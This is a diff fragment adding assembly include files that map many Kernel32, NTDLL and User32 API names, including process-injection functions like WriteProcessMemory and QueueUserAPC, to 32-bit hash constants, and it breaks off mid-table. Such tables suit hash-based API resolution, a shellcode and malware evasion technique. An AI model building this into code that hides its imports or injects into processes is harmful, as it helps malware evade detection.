+zOutputDebugStringW				 EQU 014313F1Ah
+zPeekConsoleInputA				 EQU 094B8A97Fh
+zPeekConsoleInputW				 EQU 0AAB8A97Fh
+zPeekNamedPipe					 EQU 0E1E1D6BAh
+zPostQueuedCompletionStatus			 EQU 084847E51h
+zPrepareTape				         EQU 035353723h
+zPulseEvent					 EQU 0DCD4DBC4h
+zPurgeComm					 EQU 05A5F6746h
+zQueryDosDeviceA				 EQU 0A6CADAC4h
+zQueryDosDeviceW				 EQU 0BCCADAC4h
+zQueryPerformanceCounter			 EQU 04538481Dh
+zQueryPerformanceFrequency			 EQU 0180415F0h
+zQueryWin31IniFilesMappedToRegistry		 EQU 00EFAFDCFh
+zQueueUserAPC					 EQU 0507297A4h
+zRaiseException					 EQU 08B86785Dh
+zReadConsoleA					 EQU 07B9B9B7Eh
+zReadConsoleInputA				 EQU 08DAD9E76h
+zReadConsoleInputExA				 EQU 04B6B585Fh
+zReadConsoleInputExW				 EQU 0616B585Fh
+zReadConsoleInputW				 EQU 0A3AD9E76h
+zReadConsoleOutputA				 EQU 00F2F1FF7h
+zReadConsoleOutputAttribute			 EQU 085817246h
+zReadConsoleOutputCharacterA			 EQU 09FBFB296h
+zReadConsoleOutputCharacterW			 EQU 0B5BFB296h
+zReadConsoleOutputW				 EQU 0252F1FF7h
+zReadConsoleW					 EQU 0919B9B7Eh
+zReadDirectoryChangesW				 EQU 0303A2C12h
+zReadFile					 EQU 0E5E1DAC2h
+zReadFileEx					 EQU 0A38CAC97h
+zReadFileScatter				 EQU 0BEADAD87h
+zReadProcessMemory				 EQU 0C1A99C7Ah
+zRegisterConsoleVDM				 EQU 0E7012218h
+zRegisterWaitForInputIdle			 EQU 0797B745Ah
+zRegisterWowBaseHandlers			 EQU 0180BFEE4h
+zRegisterWowExec				 EQU 0EDF1F1C7h
+zReleaseMutex					 EQU 0B4A8A883h
+zReleaseSemaphore				 EQU 0474E411Fh
+zRemoveDirectoryA				 EQU 045715D38h
+zRemoveDirectoryW				 EQU 05B715D38h
+zResetEvent					 EQU 0DDDCD3BEh
+zResumeThread					 EQU 0A2B1B59Fh
+zRtlFillMemory					 EQU 003F6F8D8h
+zNTDLLRtlFillMemory				 EQU 0FDC8AA84h
+zRtlMoveMemory					 EQU 0140708E8h
+zNTDLLRtlMoveMemory				 EQU 00DD8BA94h
+zRtlUnwind					 EQU 0777F856Ch
+zNTDLLRtlUnwin	 				 EQU 071513718h
+zRtlZeroMemory					 EQU 01D1011F1h
+zNTDLLRtlZeroMemory				 EQU 016E1C39Dh
+zScrollConsoleScreenBufferA			 EQU 01E4F4025h
+zScrollConsoleScreenBufferW			 EQU 0344F4025h
+zSearchPathA					 EQU 00E2E2B07h
+zSearchPathW					 EQU 0242E2B07h
+zSetCommBreak					 EQU 0747D816Ch
+zSetCommConfig					 EQU 0E5F2EED8h
+zSetCommMask					 EQU 01B241605h
+zSetCommState					 EQU 0909F907Fh
+zSetCommTimeouts				 EQU 0EAEBDCB6h
+zSetComputerNameA				 EQU 01649492Ah
+zSetComputerNameW				 EQU 02C49492Ah
+zSetConsoleActiveScreenBuffer			 EQU 0F2F4F4D8h
+zSetConsoleCP					 EQU 0698DAF9Ah
+zSetConsoleCommandHistoryMode			 EQU 0132222FDh
+zSetConsoleCtrlHandler				 EQU 02D2F2F0Fh
+zSetConsoleCursor				 EQU 056584E29h
+zSetConsoleCursorInfo				 EQU 0E3E8E7C6h
+zSetConsoleCursorPosition			 EQU 0AEB4AA8Ch
+zSetConsoleDisplayMode				 EQU 035444522h
+zSetConsoleFont					 EQU 06E6E6545h
+zSetConsoleHardwareState			 EQU 00A1909F4h
+zSetConsoleIcon					 EQU 060665C48h
+zSetConsoleInputExeNameA			 EQU 0CF0201E0h
+zSetConsoleInputExeNameW			 EQU 0E50201E0h
+zSetConsoleKeyShortcuts				 EQU 0D2D3C49Bh
+zSetConsoleMaximumWindowSize			 EQU 0CDDCC7A8h
+zSetConsoleMenuClose				 EQU 064736543h
+zSetConsoleMode					 EQU 05C6B6C4Ch
+zSetConsoleNumberOfCommandsA			 EQU 06DA09278h
+zSetConsoleNumberOfCommandsW			 EQU 083A09278h
+zSetConsoleOutputCP				 EQU 0FD21431Ch
+zSetConsolePalette				 EQU 0A7B6A781h
+zSetConsoleScreenBufferSize			 EQU 031402B0Ch
+zSetConsoleTextAttribute			 EQU 03443340Ah
+zSetConsoleTitleA				 EQU 01B4E4E30h
+zSetConsoleTitleW				 EQU 0314E4E30h
+zSetConsoleWindowInfo				 EQU 0DDE2E1C0h
+zSetCriticalSectionSpinCount			 EQU 0ACACA378h
+zNTDLLRtlSetCriticalSectionSpinCount		 EQU 0D3A38956h
+zSetCurrentDirectoryA				 EQU 0E012FED9h
+zSetCurrentDirectoryW				 EQU 0F612FED9h
+zSetDefaultCommConfigA				 EQU 0EF222003h
+zSetDefaultCommConfigW				 EQU 005222003h
+zSetEndOfFile					 EQU 04F5E573Eh
+zSetEnvironmentVariableA			 EQU 004373716h
+zSetEnvironmentVariableW			 EQU 01A373716h
+zSetErrorMode					 EQU 092A1A283h
+zSetEvent					 EQU 00403FAE7h
+zSetFileApisToANSI				 EQU 0002B3D3Dh
+zSetFileApisToOEM				 EQU 0B5DCFCFCh
+zSetFileAttributesA				 EQU 0EE2112FBh
+zSetFileAttributesW				 EQU 0042112FBh
+zSetFilePointer					 EQU 065676742h
+zSetFileTime					 EQU 012211900h
+zSetHandleCount					 EQU 05959502Ah
+zSetHandleInformation				 EQU 0D8DED4B8h
+zSetLastConsoleEventActive			 EQU 0CDDCCBADh
+zSetLastError					 EQU 0A1A39977h
+zSetLocalTime					 EQU 07D8C846Bh
+zSetLocaleInfoA					 EQU 021544A33h
+zSetLocaleInfoW					 EQU 037544A33h
+zSetMailslotInfo				 EQU 0D5DAD9BAh
+zSetNamedPipeHandleState			 EQU 0C7D6C7B2h
+zSetPriorityClass				 EQU 05D5E503Dh
+zSetProcessAffinityMask				 EQU 0ACB5A792h
+zSetProcessPriorityBoost			 EQU 05050421Eh
+zSetProcessShutdownParameters			 EQU 0595A4D31h
+zSetProcessWorkingSetSize			 EQU 08F9E896Bh
+zSetStdHandle					 EQU 07A89826Eh
+zSetSystemPowerState				 EQU 099A89985h
+zSetSystemTime					 EQU 018271F05h
+zSetSystemTimeAdjustment			 EQU 03B3B3218h
+zSetTapeParameters				 EQU 0A3A49780h
+zSetTapePosition				 EQU 0E3E9DFC5h
+zSetThreadAffinityMask				 EQU 0252E200Bh
+zSetThreadContext				 EQU 042422F18h
+zSetThreadIdealProcessor			 EQU 0FF00F6CFh
+zSetThreadLocale				 EQU 0ACBBB4A2h
+zSetThreadPriority				 EQU 0BFBAAB90h
+zSetThreadPriorityBoost				 EQU 0C8C8BA97h
+zSetTimeZoneInformation				 EQU 0B8BEB497h
+zSetUnhandledExceptionFilter			 EQU 0B1B3B389h
+zSetVDMCurrentDirectories			 EQU 04F505032h
+zSetVolumeLabelA				 EQU 09DD0C9B3h
+zSetVolumeLabelW				 EQU 0B3D0C9B3h
+zSetWaitableTimer				 EQU 02F313112h
+zSetupComm					 EQU 0737A7254h
+zShowConsoleCursor				 EQU 0CDCAC39Eh
+zSignalObjectAndWait				 EQU 04033331Fh
+zSizeofResource					 EQU 0869BA17Eh
+zSleep						 EQU 0D5CAD1BFh
+zSleepEx				 	 EQU 09380A789h
+zSuspendThread					 EQU 003122610h
+zSwitchToFiber					 EQU 0EDE4F6E4h
+zSwitchToThread					 EQU 05E637963h
+zSystemTimeToFileTime				 EQU 0ADBBC7ABh
+zSystemTimeToTzSpecificLocalTime		 EQU 0111F2B0Ah
+zTerminateProcess				 EQU 06261533Dh
+zTerminateThread				 EQU 0DAE8ECD7h
+zTlsAlloc					 EQU 0ECFCF9E0h
+zTlsFree				 	 EQU 083919879h
+zTlsGetValue					 EQU 0202E250Ah
+zTlsSetValue					 EQU 02C3A3116h
+zTransactNamedPipe				 EQU 0918D8F75h
+zTransmitCommChar				 EQU 03A293A21h
+zTrimVirtualBuffer				 EQU 0B3AAB7A0h
+zTryEnterCriticalSection			 EQU 0061113F7h
+zNTDLLRtlTryEnterCriticalSection		 EQU 04015FAD5h
+zUnhandledExceptionFilter			 EQU 0857B845Dh
+zUnlockFile					 EQU 0BFC6C8B2h
+zUnlockFileEx					 EQU 07D719A87h
+zUnmapViewOfFile				 EQU 0A5ADAF97h
+zUpdateResourceA				 EQU 0C7EAF5E3h
+zUpdateResourceW				 EQU 0DDEAF5E3h
+zVDMConsoleOperation				 EQU 08A693E25h
+zVDMOperationStarted				 EQU 08E775632h
+zVerLanguageNameA				 EQU 0EB1C1C00h
+zVerLanguageNameW				 EQU 0011C1C00h
+zVerifyConsoleIoHandle				 EQU 026332C17h
+zVirtualAlloc				 	 EQU 0A4B3AD94h
+zVirtualAllocEx					 EQU 0625C806Fh
+zVirtualBufferExceptionHandler			 EQU 087878B6Bh
+zVirtualFree					 EQU 03B484C2Dh
+zVirtualFreeEx					 EQU 0F8F31704h
+zVirtualLock					 EQU 042494F33h
+zVirtualProtect					 EQU 09B999F8Ch
+zVirtualProtectEx				 EQU 059537754h
+zVirtualQuery					 EQU 0CFC8BFADh
+zVirtualQueryEx					 EQU 08D87AB84h
+zVirtualUnlock					 EQU 0262D3316h
+zWaitCommEvent					 EQU 005FAEDDCh
+zWaitForDebugEvent				 EQU 0897E715Eh
+zWaitForMultipleObjects				 EQU 0B8AE9B88h
+zWaitForMultipleObjectsEx			 EQU 07667835Fh
+zWaitForSingleObject			         EQU 05A4F4D39h
+zWaitForSingleObjectEx				 EQU 018092501h
+zWaitNamedPipeA					 EQU 02C545033h
+zWaitNamedPipeW					 EQU 042545033h
+zWideCharToMultiByte				 EQU 04B4A3F17h
+zWinExec					 EQU 086919573h
+zWriteConsoleA					 EQU 0F119260Dh
+zWriteConsoleInputA				 EQU 0032B2905h
+zWriteConsoleInputVDMA				 EQU 0EB133844h
+zWriteConsoleInputVDMW				 EQU 001133844h
+zWriteConsoleInputW				 EQU 0192B2905h
+zWriteConsoleOutputA				 EQU 084ACAA86h
+zWriteConsoleOutputAttribute			 EQU 0FAFEFCD5h
+zWriteConsoleOutputCharacterA			 EQU 0153D3D25h
+zWriteConsoleOutputCharacterW			 EQU 02B3D3D25h
+zWriteConsoleOutputW				 EQU 09AACAA86h
+zWriteConsoleW					 EQU 00719260Dh
+zWriteFile					 EQU 05B5F6551h
+zWriteFileEx					 EQU 0190A3726h
+zWriteFileGather				 EQU 0B8AFBCA7h
+zWritePrivateProfileSectionA			 EQU 0A4CCD0AFh
+zWritePrivateProfileSectionW			 EQU 0BACCD0AFh
+zWritePrivateProfileStringA		         EQU 0466E7959h
+zWritePrivateProfileStringW			 EQU 05C6E7959h
+zWritePrivateProfileStructA			 EQU 0547C7A65h
+zWritePrivateProfileStructW			 EQU 06A7C7A65h
+zWriteProcessMemory				 EQU 037272709h
+zWriteProfileSectionA				 EQU 0C6EEF2D4h
+zWriteProfileSectionW				 EQU 0DCEEF2D4h
+zWriteProfileStringA				 EQU 068909B7Eh
+zWriteProfileStringW				 EQU 07E909B7Eh
+zWriteTapemark					 EQU 012101002h
+z_hread						 EQU 02B394039h
+z_hwrite					 EQU 0B5C7BBB0h
+z_lclose				 	 EQU 0B4B2AB9Ah
+z_lcreat				         EQU 0AD9CA7A0h
+z_llseek				 	 EQU 0A9AAB1AAh
+z_lopen					 	 EQU 044454C3Ah
+z_lread					         EQU 02B39443Dh
+z_lwrite				 	 EQU 0B5C7BFB4h
+zlstrcat				 	 EQU 0ABABBDC5h
+zlstrcatA					 EQU 0ED201F28h
+zlstrcatW					 EQU 003201F28h
+zlstrcmp				 	 EQU 0B3B7BDC5h
+zlstrcmpA					 EQU 0F5282B28h
+zlstrcmpW					 EQU 00B282B28h
+zlstrcmpi					 EQU 01D282B28h
+zlstrcmpiA					 EQU 05E919B95h
+zlstrcmpiW					 EQU 074919B95h
+zlstrcpy				 	 EQU 0BFBABDC5h
+zlstrcpyA					 EQU 001342E28h
+zlstrcpyW					 EQU 017342E28h
+zlstrcpyn					 EQU 02E342E28h
+zlstrcpynA					 EQU 06FA2A798h
+zlstrcpynW					 EQU 085A2A798h
+zlstrlen				 	 EQU 0B2B8C6C5h
+zlstrlenA					 EQU 0F4272C31h
+zlstrlenW					 EQU 00A272C31h
+===== end   crc32.inc =====
+
+===== begin crc32use.inc =====
+zUSER32dll					 EQU 022FBE2D2h
+zActivateKeyboardLayout				 EQU 0CFCFBD88h
+zAdjustWindowRect				 EQU 0675D5E35h
+zAdjustWindowRectEx				 EQU 0251735FDh
+zAnyPopup					 EQU 0161F17E7h
+zAppendMenuA					 EQU 0103F3A0Ah
+zAppendMenuW					 EQU 0263F3A0Ah
+zArrangeIconicWindows				 EQU 0E1E0DBA7h
+zAttachThreadInput				 EQU 099999864h
+zBeginDeferWindowPos				 EQU 06D615743h
+zBeginPaint					 EQU 0D5C8BF96h
+zBringWindowToTop				 EQU 04841442Dh
+zBroadcastSystemMessage				 EQU 0C1CBD6B0h
+zBroadcastSystemMessageA			 EQU 003313E11h
+zBroadcastSystemMessageW			 EQU 019313E11h
+zCallMsgFilter					 EQU 0FCF6F2BEh
+zCallMsgFilterA					 EQU 03E695832h
+zCallMsgFilterW					 EQU 054695832h
+zCallNextHookEx					 EQU 05D516D41h
+zCallWindowProcA			         EQU 0BDE8E6B6h
+zCallWindowProcW				 EQU 0D3E8E6B6h
+zCascadeChildWindows				 EQU 062624C1Ah
+zCascadeWindows					 EQU 07C7C6636h
+zChangeClipboardChain				 EQU 0B3A6A581h
+zChangeDisplaySettingsA				 EQU 0A9C9BE93h
+zChangeDisplaySettingsExA			 EQU 06787776Dh
+zChangeDisplaySettingsExW			 EQU 07D87776Dh
+zChangeDisplaySettingsW				 EQU 0BFC9BE93h
+zChangeMenuA					 EQU 0133325F8h
+zChangeMenuW					 EQU 0293325F8h
+zCharLowerA					 EQU 0BEDED4B0h
+zCharLowerBuffA					 EQU 04363653Eh
+zCharLowerBuffW					 EQU 05963653Eh
+zCharLowerW					 EQU 0D4DED4B0h
+zCharNextA					 EQU 054746831h
+zCharNextExA					 EQU 01232221Dh
+zCharNextW					 EQU 06A746831h
+zCharPrevA					 EQU 052726440h
+zCharPrevExA					 EQU 01030201Bh
+zCharPrevW					 EQU 068726440h
+zCharToOemA					 EQU 099B9B490h
+zCharToOemBuffA					 EQU 01E3E4019h
+zCharToOemBuffW					 EQU 0343E4019h
+zCharToOemW					 EQU 0AFB9B490h
+zCharUpperA					 EQU 0C1E1D7B3h
+zCharUpperBuffA					 EQU 046666841h
+zCharUpperBuffW					 EQU 05C666841h
+zCharUpperW					 EQU 0D7E1D7B3h
+zCheckDlgButton					 EQU 0655C5520h
+zCheckMenuItem					 EQU 0F5EDF0BCh
+zCheckMenuRadioItem				 EQU 0E6DEE1ABh
+zCheckRadioButton				 EQU 03E352DF8h
+zChildWindowFromPoint				 EQU 0ECE1DBAFh
+zChildWindowFromPointEx				 EQU 0AA9BBE86h
+zClientThreadSetup				 EQU 0B5AEA56Fh
+zClientToScreen					 EQU 06E69704Ah
+zClipCursor					 EQU 0F0E7E4B2h
+zCloseClipboard					 EQU 06C77714Fh
+zCloseDesktop					 EQU 0B5B4B17Dh
+zCloseWindow					 EQU 0534B4824h
+zCloseWindowStation				 EQU 03839360Ah
+zCopyAcceleratorTableA				 EQU 00E3D4717h
+zCopyAcceleratorTableW				 EQU 0243D4717h
+zCopyIcon					 EQU 0040605E4h
+zCopyImage					 EQU 05E697151h
+zCopyRect					 EQU 0090510EDh
+zCountClipboardFormats				 EQU 05557522Dh
+zCreateAcceleratorTableA			 EQU 0CFF400D0h
+zCreateAcceleratorTableW			 EQU 0E5F400D0h
+zCreateCaret					 EQU 02C1D29F8h
+zCreateCursor					 EQU 0BBAEB17Eh
+zCreateDesktopA					 EQU 0597D7F4Fh
+zCreateDesktopW					 EQU 06F7D7F4Fh
+zCreateDialogIndirectParamA			 EQU 0F71B1FF9h
+zCreateDialogIndirectParamAorW			 EQU 0303E3E08h
+zCreateDialogIndirectParamW			 EQU 00D1B1FF9h
+zCreateDialogParamA				 EQU 0C1E5EAC7h
+zCreateDialogParamW				 EQU 0D7E5EAC7h
+zCreateIcon					 EQU 0C5BCBF9Dh
+zCreateIconFromResource				 EQU 0A6A6B57Fh
+zCreateIconFromResourceEx			 EQU 064517E54h
+zCreateIconIndirect				 EQU 0FAEBFAD3h
+zCreateMDIWindowA				 EQU 0D1F5F0C0h
+zCreateMDIWindowW				 EQU 0E7F5F0C0h
+zCreateMenu					 EQU 0D1C1C5A1h
+zCreatePopupMenu				 EQU 0E7D7DBB5h
+zCreateWindowExA				 EQU 0B4D8D2CCh
+zCreateWindowExW				 EQU 0CAD8D2CCh
+zCreateWindowStationA				 EQU 0DC0003D1h
+zCreateWindowStationW				 EQU 0F20003D1h
+zDdeAbandonTransaction				 EQU 040372C00h
+zDdeAccessData					 EQU 0CFD3C3A3h
+zDdeAddData					 EQU 08589795Ah
+zDdeClientTransaction				 EQU 0EBE2D7ACh
+zDdeCmpStringHandles				 EQU 05C4E4D1Fh
+zDdeConnect					 EQU 0CCBDBE9Bh
+zDdeConnectList					 EQU 06A5B4C23h
+zDdeCreateDataHandle				 EQU 0202017F2h
+zDdeCreateStringHandleA				 EQU 05F838253h
+zDdeCreateStringHandleW				 EQU 075838253h
+zDdeDisconnect					 EQU 00DFEFFDBh
+zDdeDisconnectList				 EQU 0AB9C8D63h
+zDdeEnableCallback				 EQU 059535432h
+zDdeFreeDataHandle				 EQU 04D4D4520h
+zDdeFreeStringHandle					 EQU 04B4B431Dh
+zDdeGetData					 EQU 09CA09071h
+zDdeGetLastError					 EQU 0C2B5AA78h
+zDdeGetQualityOfService					 EQU 09696976Bh
+zDdeImpersonateClient					 EQU 0ECDDD3ACh
+zDdeInitializeA					 EQU 0577B7A40h
+zDdeInitializeW					 EQU 06D7B7A40h
+zDdeKeepStringHandle					 EQU 04E4E4620h
+zDdeNameService					 EQU 05656572Eh
+zDdePostAdvise					 EQU 00605F6CEh
+zDdeQueryConvInfo					 EQU 03D333102h
+zDdeQueryNextServer					 EQU 0322523ECh
+zDdeQueryStringA					 EQU 0D2F6F3C5h
+zDdeQueryStringW					 EQU 0E8F6F3C5h
+zDdeReconnect					 EQU 0A4959672h
+zDdeSetQualityOfService					 EQU 0A2A2A377h
+zDdeSetUserHandle					 EQU 01C1C13EFh
+zDdeUnaccessData					 EQU 0B3B7A786h
+zDdeUninitialize					 EQU 0F9F9E3BAh
+zDefDlgProcA					 EQU 0EF1415E8h
+zDefDlgProcW					 EQU 0051415E8h
+zDefFrameProcA					 EQU 0C3E8EABCh
+zDefFrameProcW					 EQU 0D9E8EABCh
+zDefMDIChildProcA					 EQU 097BCBE8Fh
+zDefMDIChildProcW					 EQU 0ADBCBE8Fh
+zDefWindowProcA					 EQU 051767849h
+zDefWindowProcW					 EQU 067767849h
+zDeferWindowPos					 EQU 085786E5Eh
+zDeleteMenu					 EQU 0D5CCC3A0h
+zDeregisterShellHookWindow					 EQU 0FCF7EDC5h
+zDestroyAcceleratorTable					 EQU 023312A04h
+zDestroyCaret					 EQU 0C0BFBF8Eh
+zDestroyCursor					 EQU 050514714h
+zDestroyIcon					 EQU 05A5F5533h
+zDestroyMenu					 EQU 066645B37h
+zDestroyWindow					 EQU 04A463C18h
+zDialogBoxIndirectParamA					 EQU 0D6F6F2CEh
+zDialogBoxIndirectParamAorW					 EQU 0101A10DDh
+zDialogBoxIndirectParamW					 EQU 0ECF6F2CEh
+zDialogBoxParamA					 EQU 0A1C1BD9Ch
+zDialogBoxParamW					 EQU 0B7C1BD9Ch
+zDispatchMessageA					 EQU 01B4D5129h
+zDispatchMessageW					 EQU 0314D5129h
+zDlgDirListA					 EQU 0FF251CEBh
+zDlgDirListComboBoxA					 EQU 01B413504h
+zDlgDirListComboBoxW					 EQU 031413504h
+zDlgDirListW					 EQU 015251CEBh
+zDlgDirSelectComboBoxExA					 EQU 09DC3B7AFh
+zDlgDirSelectComboBoxExW					 EQU 0B3C3B7AFh
+zDlgDirSelectExA					 EQU 081A79B96h
+zDlgDirSelectExW					 EQU 097A79B96h
+zDragDetect					 EQU 0C2AFBE9Bh
+zDragObject					 EQU 0C0ADBC99h
+zDrawAnimatedRects					 EQU 0A08E8C68h
+zDrawCaption					 EQU 0483B3E16h
+zDrawCaptionTempA					 EQU 021414315h
+zDrawCaptionTempW					 EQU 037414315h
+zDrawEdge					 EQU 0EDE9F4D3h
+zDrawFocusRect					 EQU 008F604E0h
+zDrawFrame					 EQU 064606546h
+zDrawFrameControl					 EQU 0483D400Dh
+zDrawIcon					 EQU 001F4F7D7h
+zDrawIconEx					 EQU 0BFA8D5A9h
+zDrawMenuBar					 EQU 024132423h
+zDrawMenuBarTemp					 EQU 0BBACB18Ch
+zDrawStateA					 EQU 0BBDBE8B6h
+zDrawStateW					 EQU 0D1DBE8B6h
+zDrawTextA					 EQU 05F7F7D47h
+zDrawTextExA					 EQU 01D3D3733h
+zDrawTextExW					 EQU 0333D3733h
+zDrawTextW					 EQU 0757F7D47h
+zEditWndProc					 EQU 0343A2EFFh
+zEmptyClipboard					 EQU 0818D8868h
+zEnableMenuItem					 EQU 05B4F5825h
+zEnableScrollBar					 EQU 0BBAAB7B6h
+zEnableWindow					 EQU 0AE989775h
+zEndDeferWindowPos					 EQU 095868575h
+zEndDialog					 EQU 0524F4E25h
+zEndMenu					 EQU 096858564h
+zEndPaint					 EQU 0FDEDEDC8h
+zEndTask					 EQU 0948D886Bh
+zEnumChildWindows					 EQU 041433A0Bh
+zEnumClipboardFormats					 EQU 0DFE1DBB9h
+zEnumDesktopWindows					 EQU 0383A3101h
+zEnumDesktopsA					 EQU 0FF332DFFh
+zEnumDesktopsW					 EQU 015332DFFh
+zEnumDisplayDevicesA					 EQU 04D817C56h
+zEnumDisplayDevicesW					 EQU 063817C56h
+zEnumDisplaySettingsA					 EQU 0DC100AE2h
+zEnumDisplaySettingsW					 EQU 0F2100AE2h
+zEnumPropsA					 EQU 0C4F8F3C6h
+zEnumPropsExA					 EQU 082B6ACA9h
+zEnumPropsExW					 EQU 098B6ACA9h
+zEnumPropsW					 EQU 0DAF8F3C6h
+zEnumThreadWindows					 EQU 0B5B7AE7Fh
+zEnumWindowStationsA					 EQU 081B5B081h
+zEnumWindowStationsW					 EQU 097B5B081h
+zEnumWindows					 EQU 05B5D5427h
+zEqualRect					 EQU 05D5E6C4Ah
+zExcludeUpdateRgn					 EQU 0392E3F2Dh
+zExitWindowsEx					 EQU 020114412h
+zFillRect					 EQU 0FBF3F9D9h
+zFindWindowA					 EQU 0204D3F13h
+zFindWindowExA					 EQU 0DE0AFBF9h
+zFindWindowExW					 EQU 0F40AFBF9h
+zFindWindowW					 EQU 0364D3F13h
+zFlashWindow					 EQU 056403D1Ch
+zFrameRect					 EQU 0624F5E3Dh
+zFreeDDElParam					 EQU 0928A9B6Ch
+zFullScreenControl					 EQU 0B2B2B887h
+zGetActiveWindow					 EQU 0D8D5CBAAh
+zGetAppCompatFlags					 EQU 077787657h
+zGetAsyncKeyState					 EQU 02D3C2D0Eh
+zGetCapture					 EQU 0D6E5D8A8h
+zGetCaretBlinkTime					 EQU 073827A53h
+zGetCaretPos					 EQU 024251B0Fh
+zGetClassInfoA					 EQU 0C6F9EFCDh
+zGetClassInfoExA					 EQU 084B7A4A2h
+zGetClassInfoExW					 EQU 09AB7A4A2h
+zGetClassInfoW					 EQU 0DCF9EFCDh
+zGetClassLongA					 EQU 0CAFDFBD1h
+zGetClassLongW					 EQU 0E0FDFBD1h
+zGetClassNameA					 EQU 0BBEEEEC5h
+zGetClassNameW					 EQU 0D1EEEEC5h
+zGetClassWord					 EQU 095A5986Dh
+zGetClientRect					 EQU 0F0F0F2D1h
+zGetClipCursor					 EQU 00A0C01D2h
+zGetClipboardData					 EQU 00F2212F4h
+zGetClipboardFormatNameA					 EQU 0C2F5F5C8h
+zGetClipboardFormatNameW					 EQU 0D8F5F5C8h
+zGetClipboardOwner					 EQU 0A0A2A276h
+zGetClipboardViewer					 EQU 0080A09D4h
+zGetCursor					 EQU 08082784Ah
+zGetCursorInfo					 EQU 00E1311E7h
+zGetCursorPos					 EQU 0B3B4AA9Eh
+zGetDC					 EQU 087B8D9ACh
+zGetDCEx					 EQU 045416164h
+zGetDesktopWindow					 EQU 057544A28h
+zGetDialogBaseUnits					 EQU 0E3E4D5AEh
+zGetDlgCtrlID					 EQU 03C6C8860h
+zGetDlgItem					 EQU 0A8AFAF80h
+zGetDlgItemInt					 EQU 0D4D4CBC6h
+zGetDlgItemTextA					 EQU 090C3B47Fh
+zGetDlgItemTextW					 EQU 0A6C3B47Fh
+zGetDoubleClickTime					 EQU 0D5E4DCB5h
+zGetFocus					 EQU 00202F2D5h
+zGetForegroundWindow					 EQU 099968C69h
+zGetGUIThreadInfo					 EQU 0CDD2D1A6h
+zGetIconInfo					 EQU 0181D1BF2h
+zGetInputDesktop					 EQU 0EEF2E8B7h
+zGetInputState					 EQU 0152414F7h
+zGetInternalWindowPos					 EQU 0EDEEE4D5h
+zGetKBCodePage					 EQU 088979578h
+zGetKeyNameTextA					 EQU 094C7B883h
+zGetKeyNameTextW					 EQU 0AAC7B883h
+zGetKeyState					 EQU 02D3C2D10h
+zGetKeyboardLayout					 EQU 0B4B4A477h
+zGetKeyboardLayoutList					 EQU 05252441Bh
+zGetKeyboardLayoutNameA					 EQU 078ABAB7Eh
+zGetKeyboardLayoutNameW					 EQU 08EABAB7Eh
+zGetKeyboardState					 EQU 037463718h
+zGetKeyboardType					 EQU 0D7E6DBA5h
+zGetLastActivePopup					 EQU 00A0DFDCFh
+zGetMenu					 EQU 096958C6Dh
+zGetMenuCheckMarkDimensions					 EQU 0202117E7h
+zGetMenuContextHelpId					 EQU 0B6C6E2B3h
+zGetMenuDefaultItem					 EQU 0EEF5F5C3h
+zGetMenuItemCount					 EQU 0323228F6h
+zGetMenuItemID					 EQU 0B4E500D7h
+zGetMenuItemInfoA					 EQU 0F6291EFBh
+zGetMenuItemInfoW					 EQU 00C291EFBh
+zGetMenuItemRect					 EQU 0B6B6B896h
+zGetMenuState					 EQU 099A8997Ch
+zGetMenuStringA					 EQU 051848257h
+zGetMenuStringW					 EQU 067848257h
+zGetMessageA					 EQU 0093C3C19h
+zGetMessageExtraInfo					 EQU 05B605F32h
+zGetMessagePos					 EQU 0FAFBF1E5h
+zGetMessageTime					 EQU 058675F39h
+zGetMessageW					 EQU 01F3C3C19h
+zGetNextDlgGroupItem					 EQU 0585F5F2Ch
+zGetNextDlgTabItem					 EQU 061686836h
+zGetOpenClipboardWindow					 EQU 0A19E9470h
+zGetParent					 EQU 06C6C6343h
+zGetPriorityClipboardFormat					 EQU 064646839h
+zGetProcessWindowStation					 EQU 041473D13h
+zGetProgmanWindow					 EQU 0514E4422h
+zGetPropA					 EQU 0E4170BE2h
+zGetPropW					 EQU 0FA170BE2h
+zGetQueueStatus					 EQU 08D8E7E4Dh
+zGetScrollInfo					 EQU 0FF0402D8h
+zGetScrollPos					 EQU 0A4A59B8Fh
+zGetScrollRange					 EQU 0606F6D42h
+zGetShellWindow					 EQU 074716746h
+zGetSubMenu					 EQU 0C1C0B797h
+zGetSysColor					 EQU 041433911h
+zGetSysColorBrush					 EQU 047534512h
+zGetSystemMenu					 EQU 01E1D13F2h
+zGetSystemMetrics					 EQU 06162643Dh
+zGetTabbedTextExtentA					 EQU 0A6D9CA9Dh
+zGetTabbedTextExtentW					 EQU 0BCD9CA9Dh
+zGetTaskmanWindow					 EQU 04C493F1Dh
+zGetThreadDesktop					 EQU 0373B30FFh
+zGetTopWindow					 EQU 0AEABA181h
+zGetUpdateRect					 EQU 0F4F4F6D5h
+zGetUpdateRgn					 EQU 08D939183h
+zGetUserObjectInformationA					 EQU 0C5F8EFBFh
+zGetUserObjectInformationW					 EQU 0DBF8EFBFh
+zGetUserObjectSecurity					 EQU 055504118h
+zGetWindow					 EQU 07A776D4Eh
+zGetWindowContextHelpId					 EQU 09AAAC696h
+zGetWindowDC					 EQU 002335421h
+zGetWindowLongA					 EQU 04D807E53h
+zGetWindowLongW					 EQU 063807E53h
+zGetWindowModuleFileNameA					 EQU 0285B5B2Dh
+zGetWindowModuleFileNameW					 EQU 03E5B5B2Dh
+zGetWindowPlacement					 EQU 017170DEAh
+zGetWindowRect					 EQU 00A0A0BEAh
+zGetWindowRgn					 EQU 0A2A8A698h
+zGetWindowTextA					 EQU 062958651h
+zGetWindowTextLengthA					 EQU 0C6F9F6C3h
+zGetWindowTextLengthW					 EQU 0DCF9F6C3h
+zGetWindowTextW					 EQU 078958651h
+zGetWindowThreadProcessId					 EQU 06474905Ch
+zGetWindowWord					 EQU 018281AEFh
+zGrayStringA					 EQU 034545F35h
+zGrayStringW					 EQU 04A545F35h
+zHideCaret					 EQU 056464A1Eh
+zHiliteMenuItem					 EQU 06A696D3Dh
+zImpersonateDdeClientWindow					 EQU 04E474521h
+zInSendMessage					 EQU 0FFEDF4D9h
+zInflateRect					 EQU 037293415h
+zInsertMenuA					 EQU 024564F27h
+zInsertMenuItemA					 EQU 0B4E6E7C7h
+zInsertMenuItemW					 EQU 0CAE6E7C7h
+zInsertMenuW					 EQU 03A564F27h
+zInternalGetWindowText					 EQU 056564C29h
+zIntersectRect					 EQU 018182303h
+zInvalidateRect					 EQU 066687353h
+zInvalidateRgn					 EQU 0FF070E01h
+zInvertRect					 EQU 0DBDDE8CAh
+zIsCharAlphaA					 EQU 065677957h
+zIsCharAlphaNumericA					 EQU 03B3D4D27h
+zIsCharAlphaNumericW					 EQU 0513D4D27h
